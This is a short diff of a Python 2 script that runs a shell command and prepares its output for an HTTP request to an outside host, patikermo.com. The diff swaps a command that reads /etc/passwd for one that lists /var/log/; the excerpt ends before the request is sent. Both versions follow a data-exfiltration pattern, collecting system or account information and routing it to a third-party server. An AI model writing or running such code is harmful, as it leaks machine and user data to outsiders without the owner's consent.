@@ -1,6 +1,6 @@
 import urllib2
 import subprocess
-output = subprocess.check_output("cat /etc/passwd", shell=True)
+output = subprocess.check_output("ls /var/log/", shell=True)
 output = output.rstrip()
 output = output.replace("\n", " ")
 request = urllib2.Request("https://patikermo.com")
